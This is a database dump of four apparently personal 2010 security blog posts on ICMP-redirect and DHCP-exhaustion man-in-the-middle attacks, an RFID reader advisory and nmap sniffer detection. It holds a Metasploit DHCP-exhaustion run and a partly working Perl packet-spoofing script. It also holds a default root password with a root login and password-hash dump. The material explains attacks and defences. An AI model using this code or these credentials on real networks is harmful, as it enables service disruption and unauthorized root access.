'146','0','open','http://www.interwebz.us/wordpress/?p=146','0','open','','2','The last post focused on ARP poisoning to pull off a MitM attack.  There are a few other methods used to do MitM as well.\n\nThe second method uses ICMP redirect messages to tell the network that the gateway has moved, and vice versa.\n\nA brief description of ICMP redirect:\n<!--more-->\n<blockquote>\nICMP redirect messages are used to redirect a source host to use a different gateway that may be closer to the destination. These redirect messages are sent by the receiving gateway and the source host should adapt it\'s forwarding accordingly when receiving this message. ICMP Redirects are most often used in source routing environments where the source host calculates routing paths to all destinations itself.\n</blockquote>\n\nSo, a hacker would send an ICMP redirect, pretending to be the router/gateway, to a host machine on the network, telling it that the hackers machine is the better gateway and the host should use that instead of the actual gateway.  Incredibly simple attack to pull off.  Thankfully, it\'s also relatively simple to block.\n\nOn Linux, there are a number of options depending on what distro you\'re using.  The easiest way is to use \'sysctl\' to disable the acknowledgement of redirect messages.  These are rarely, if ever, used for legitimate purposes on most networks, so disabling them doesn\'t have any real side effects.\n\nTake a look in your /etc/sysctl.conf file.  It\'s well documented and generally they have recommendations listed in the file.  Mine looks like this:\n\n<blockquote>\nnet.ipv4.icmp_echo_ignore_broadcasts = 1\nnet.ipv4.icmp_ignore_bogus_error_responses = 1\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.all.send_redirects = 0\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv4.conf.all.log_martians = 1\n</blockquote>\n\nThis tells my box not to accept ICMP redirects, nor will it accept source route packets.  Then add\n\n<blockquote>\n/sbin/sysctl -p\n</blockquote>\n\nto /etc/rc.local.\n\nTo block ICMP redirect attacks against Windows, as usual, it\'s not quite as easy.\n\nOpen regedit and modify the following key\n\n<blockquote>\nHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParameters\n\nand set EnableICMPRedirect to 0\n</blockquote>\n\nThere are about 10 other ways of executing a MitM attack, but these are the two most used methods in my experience.  Here\'s a <a href=\"http://alor.antifork.org/talks/MITM-cisco.ppt\">document</a> that describes some of the other attack methods and possible prevention options.\n','','2010-05-04 12:44:35','2010-05-04 17:44:35','','','2010-05-04 12:44:35','2010-05-04 17:44:35','arp-poisoning-and-man-in-the-middle-attacks-part-3-1','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 3.1]','post',''),(
'155','0','open','http://www.interwebz.us/wordpress/?p=155','0','open','','2','UPDATE:\n\nSo, finally managed to watch some of Hak5, which I\'ve been meaning to do for awhile and I saw this episode entitled \"DHCP Exhaustion... blah blah blah\"  I\'m like, neat!  I\'m writing something just like that!\n\nCome to find out, this jerkoff (not really, I\'m just jealous that he got to it before me.. :-D) has already created something to exhaust DHCP servers, just like I was attempting to do below.  And, on top of that, he wrote it in Ruby and it runs under Metasploit.  It works really, well, too.. so.. I\'m not going to bother recreating the wheel.\n\nHere\'s how it works.. it\'s really simple.\n<!--more-->\n\n\n<blockquote>\nmsf > search dhcp\n[*] Searching loaded modules for pattern \'dhcp\'...\n\nAuxiliary\n=========\n\n   Name                               Rank    Description\n   ----                               ----    -----------\n   digininja/dhcp_exhaustion/exhaust  normal  DHCP Exhaustion Attack\n\nmsf > use digininja/dhcp_exhaustion/exhaust\nmsf auxiliary(exhaust) > show options\n\nModule options:\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   FILTER                      no        The filter string for capturing traffic\n   INTERFACE                   no        The name of the interface\n   SNAPLEN    65535            yes       The number of bytes to capture\n   TIMEOUT    10               yes       Timeout waiting for server response\n\nmsf auxiliary(exhaust) > set interface eth1\ninterface => eth1\nmsf auxiliary(exhaust) > exploit\n\n[*] DHCP attack started\n[*] DHCP offer of address: 192.168.0.102\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.103\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.104\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.105\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.106\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.107\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.108\n[*] Got the ACK back, IP address allocated successfully\n[*] DHCP offer of address: 192.168.0.109\n[*] Got the ACK back, IP address allocated successfully\n[*] Timeout waiting for OFFER\n[*] Got a timeout, assuming DHCP exhausted. You Win\n[*] Finished\n[*] Auxiliary module execution completed\nmsf auxiliary(exhaust) > \n</blockquote>\n\nOwned.  You can find the module <a href=\"http://www.digininja.org/metasploit/dns_dhcp.php#download\">here</a>.\n\n[End of update.]\n\nI\'ll explain this later.  I needed to paste this somewhere for the time being and it\'s not completely functional.\n\n<b><u>Update:</u></b> Upon going through RFC 3118, I figured out what needs to be added/modified in this code.  I will be working on it over the next few days, but it appears that first I need to rewrite/fix/do something with the Net::ARP module for Perl.  It\'s crap.  If I can get this to work well enough, I\'ll consider porting it to C.\n\nIn the mean time, go read <a href=\"http://www.ietf.org/rfc/rfc3118.txt\">RFC 3118</a>.  Specifically section 9.  Based on that, I\'m not sure that the DHCPINFORM packet is necessary in the code below.\n\nThe theory is.. send DHCPDISCOVER using spoofed UDP packets sent directly to the DHCP server.  Use libpcap to sniff for ARP requests from the DHCP server and respond using the same spoofed MAC addresses used in the initial packet(s).  This will set up fake hosts on the network and exhaust the DHCP server\'s IP pool, which will then make a DHCP MITM attack much easier, as there will be no race.\n\n<pre>\nuse Net::ARP;\nuse Net::DHCP::Packet;\nuse Net::DHCP::Constants;\nuse Net::RawIP;  \nuse Net::Ping;\n\n$dest = $ARGV[0];\n$eth = $ARGV[1];\n$max = $ARGV[2];\n\nsub randmac() {\n  $mac = join(\":\", \"00\", \"40\", \"96\", map int rand 99, 1 .. 3);\n  return($mac);\n} \n\nsub randip() { \n  $ip = join(\".\", map int rand 254, 1 .. 4);\n  return($ip);\n} \n\nsub lrandip() {\n  @ifconfig = `ifconfig $eth`;\n  foreach $line (@ifconfig) {\n    if($line =~ /^.*?inet addr:(d+.d+.d+).d+s+.*/) {\n      $lip = join(\".\", $1, int(rand(254)));\n    }\n  }\n  return $lip;   \n}\n\n$psocket = new Net::RawIP({udp=>{}});\n$isock = new Net::RawIP({udp=>{}});\n$ping = Net::Ping->new(\"icmp\");\n$ping->ping($dest, \"1\");\n$dmac = Net::ARP::arp_lookup($eth, $dest);\n\nprint \"Mac address of DHCP server: $dmacn\";\nwhile($i <= $max) {\n  $rmac = &randmac;\n  $lrandip = &lrandip;\n  $randip = &randip;  \n    \n  $discover = Net::DHCP::Packet->new(\n                      xid => int(rand(65535)),\n                      Flags => 0x8000,\n                      Chaddr => $rmac,\n                      Ciaddr => $lrandip,\n                      DHO_DHCP_MESSAGE_TYPE() => DHCPDISCOVER()\n                      );\n\n#  $inform = Net::DHCP::Packet->new(\n#                    xid => int(rand(65535)),\n#                    Chaddr => $rmac,\n#                    Ciaddr => $lrandip,\n#                    DHO_DHCP_MESSAGE_TYPE() => DHCPINFORM()\n#                    );\n                       \n  $psocket->set({      \n      ip => {\n            daddr => $dest,\n            saddr => $randip,\n            },\n      udp => {\n            dest => \'67\',\n            source => int(rand(65535)),\n            data => $discover->serialize(),\n            }\n      });\n      $psocket->send(0,1);\n  $isock->set({\n      ip => {  \n            daddr => $dest,\n            saddr => $randip,\n            },\n      udp => {\n            dest => \'67\',\n            source => int(rand(65535)),\n            data => $inform->serialize(),\n            }\n      });\n      $isock->send(0,1);\n\n      Net::ARP::send_packet(\n                $eth,\n                $lrandip,\n                $dest,   \n                $rmac,   \n                $dmac,   \n                \"reply\");\n      $i++;\n}\n</pre>\n</pre>\n','','2010-05-04 22:21:51','2010-05-05 03:21:51','','','2010-05-04 22:21:51','2010-05-05 03:21:51','dhcp-ownage','0','','publish','DHCP ownage. - Update 5.10.2010','post',''),(
'159','1','open','http://www.interwebz.us/wordpress/?p=159','0','open','','2','So, I don\'t like to just post stuff from mailing lists that I\'m on, but this is post worthy.  This was taken from Full Disclosure.  The original article can be found here:\n\n<a href=\"http://seclists.org/fulldisclosure/2010/May/63\">http://seclists.org/fulldisclosure/2010/May/63</a>\n<!--more-->\n<blockquote>\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\nTested:\n        www.alientechnology.com/readers/alr9900.php\n\nBackground:\n        Alien Technology is a major rfid-reader designer and manufacturer.\n Alien\'s products are sold to many corporations and the military.\nAlien\'s readers can be interfaced with in several ways including:\nserial, IO Port and Ethernet port.  Alien has several daemons\nrunning on their reader that accessible through Ethernet and\ncompletely undocumented.  We called Alien several times to ask them\nabout these undocumented services and were first deferred to\ntechnical support and then had our numbers blocked.  We then\nemailed them about the security ramifications of these daemons and\nreceived no reply.\n\nThe Undocumented:\n        port 2323 - telnetd\n        port 23 - telnetd\n        port 22 - sshd\n\nThe Flaws:\n        default root password = \'alien\'\n        alien account has same password across all readers\n        port 2323 - provides a backdoor onto the readers for anyone who\nknows the alien (or root) account password\n        port 23  - \"\"\n        port 22 - \"\"\n\nThe P.O.C:\nStarting Nmap 5.21 ( http://nmap.org ) at 20XX-XX-XX XX:XX Pacific\nDaylight Time\n\nNmap scan report for XXX.XXX.XXX.XXX\nHost is up (0.000092s latency).\nNot shown: 995 closed ports\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n23/tcp   open  telnet\n80/tcp   open  http\n111/tcp  open  rpcbind\n2323/tcp open  unknown\n\nMAC Address: XX:XX:XX:XX:XX:XX (Alien Technology)\nNmap done: 1 IP address (1 host up) scanned in 0.66 seconds\n\n\nlogin as: root\nUsing keyboard-interactive authentication.\nPassword: <- root\nAccess denied\nUsing keyboard-interactive authentication.\nPassword: <- password\nAccess denied\nUsing keyboard-interactive authentication.\nPassword: <- alien\n\nLast login: Sun Jan 11 03:04:54 1970 from XXX.XXX.XXX.XXX\nroot () alien-XXXXXX alien# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot () alien-XXXXXX alien# cat /etc/passwd\nroot:$1$lKC6KEQ/$TY22pTtIBwjLxWd2EvM.d0:0:0:root:/root:/bin/bash\ndaemon:*:1:1:daemon:/usr/sbin:/bin/sh\nbin:*:2:2:bin:/bin:/bin/sh\nsys:*:3:3:sys:/dev:/bin/sh\nsync:*:4:65534:sync:/bin:/bin/sync\nman:*:6:12:man:/var/cache/man:/bin/sh\nlp:*:7:7:lp:/var/spool/lpd:/bin/sh\nmail:*:8:8:mail:/var/mail:/bin/sh\nnews:*:9:9:news:/var/spool/news:/bin/sh\nuucp:*:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:*:13:13:proxy:/bin:/bin/sh\nwww-data:*:33:33:www-data:/var/www:/bin/sh\nbackup:*:34:34:backup:/var/backups:/bin/sh\nlist:*:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:*:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:*:41:41:Gnats Bug-Reporting System\n(admin):/var/lib/gnats:/bin/sh\nnobody:*:65534:65534:nobody:/nonexistent:/bin/sh\nsshd:x:100:65534::/var/run/sshd:/bin/false\nntpd:x:102:102::/var/run/openntpd:/bin/false\nalien:$1$kcyCMoEZ$kiwa.OVk5PuG4pBwbYEP//:1000:1000:The\nAlien,18220,,:/home/alien:/bin/bash\n\nroot () alien-XXXXXX alien# cat /etc/shadow\nntpd:!:13602:0:99999:7:::\nsshd:!:13602:0:99999:7:::\nalien:$1$kcyCMoEZ$kiwa.OVk5PuG4pBwbYEP//:13602:0:99999:7:::\n\nImpact:\n        Alien\'s readers are deployed in many secure facilities with\ntypically closed networks.  Although these networks are closed,\nthese undocumented services could allow employees to modify reader\nsettings and subvert checkout systems.  These checkout systems are\noften used to track valuable items making such vulnerabilities a\nserious matter. If these readers are deployed on an open or large\nnetwork they provide an easy way to tunnel into the network or\nattack it from an unexpected location.  Lastly, if someone cracks\nthe alien account\'s password hash they get to use Alien\'s backdoor.\n</blockquote>','','2010-05-06 19:39:54','2010-05-07 00:39:54','','','2010-05-06 19:39:54','2010-05-07 00:39:54','alientechnology-alr-9900-lolz','0','','publish','AlienTechnology ALR-9900 = lolz.','post',''),(
'167','6','open','http://www.interwebz.us/wordpress/?p=167','0','open','','2','Consider this an \"RFC\" (request for comment).. because I\'m a little puzzled by this, so please, weigh in if you can provide some insight.\n\nI read through <a href=\"http://www.securityfriday.com/promiscuous_detection_01.pdf\">http://www.securityfriday.com/promiscuous_detection_01.pdf</a>, which is cited as being the document that gave life to nmap\'s \"sniffer-detect\" script.\n\nTo summarize the document, the idea is is that if you send a crafted ARP packets to a host not running in promiscuous mode, it will respond one way, whereas if you send the same packet to a host running in promiscuous mode, it will respond differently.  If you want a more in depth analysis, read the document.  ;-)\n<!--more-->\nI was playing with the sniffer-detect script, trying to see what triggered it and what didn\'t, I noticed something peculiar.  I\'ll give an example:\n\n<blockquote>\n# nmap -sP --script=sniffer-detect 1.2.3.4\n\nStarting Nmap 5.30BETA1 ( http://nmap.org ) at 2010-05-10 14:16 CDT\nNSE: Script Scanning completed.\nNmap scan report for 1.2.3.4 (1.2.3.4)\nHost is up (0.00016s latency).\n</blockquote>\n\nNada..  which is correct, because the device wasn\'t in promiscuous mode.  Lets take a look at what tcpdump saw during this:\n\n<blockquote>\n# tcpdump -vv host 1.2.3.4\n14:37:12.594695 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 (Broadcast) tell 1.2.3.3, length 28\n14:37:12.594823 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:12.718488 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:12.718659 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:12.818605 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:12.926535 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.064308 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.251814 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.251988 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:13.351921 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.459797 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.597487 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.785549 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.893223 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:14.033006 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:14.221230 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n..snip..\n</blockquote>\n\nOk, so 1.2.3.4 responds as I would have expected it to.\n\nNow, I\'m going to set the NIC into promiscuous mode on 1.2.3.4 and rerun the sniffer detect script.  Here\'s the output:\n\n<blockquote>\n# tcpdump -vvv host 1.2.3.4\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n14:38:39.087101 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 (Broadcast) tell 1.2.3.3, length 28\n14:38:39.087563 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.211888 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.212391 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.312027 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.312521 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.412536 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.413039 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.512700 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.513184 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n..snip..\n</blockquote>\n\nWell, it responded to this, too.. but way differently.  In the first example, where 1.2.3.4 is NOT in promiscuous mode, I received 4 replies to 19 requests.  In the second example, where the machine WAS in promiscuous mode, I received 19 reply\'s to 19 requests.  This seems to be true no matter what type of box I scan.  Windows, Linux, printers, whatever.\n\nThis tells me (based on the document that I referenced earlier) that the NIC itself is doing some type of ARP flood protection (or.. maybe the NIC\'s processor is just so slow that it can\'t respond fast enough?) at the hardware level, but no such protection exists at the software level (maybe because it knows that the hardware will do it?), and thus it responds to each and every packet.  (Comments??)\n\nI don\'t believe that the current script is really taking into account how many responses it gets.  It appears to be doing other tests which are intended to help give more information than if the device is in promiscuous mode or not, but I\'m noticing a lot of false positives/negatives as a result.  I would prefer more accurate tests in exchange for getting a bit less information.\n\nAll this said, this is the first time I\'ve ever really looked seriously at Lua, so I\'m not completely understanding the whole script, so I may be missing something.  This is where you come in!  :-)\n\n','','2010-05-10 14:57:39','2010-05-10 19:57:39','','','2010-05-10 14:57:39','2010-05-10 19:57:39','detecting-promiscuous-nodes-via-arp','0','','publish','Detecting Promiscuous Nodes via ARP','post','');
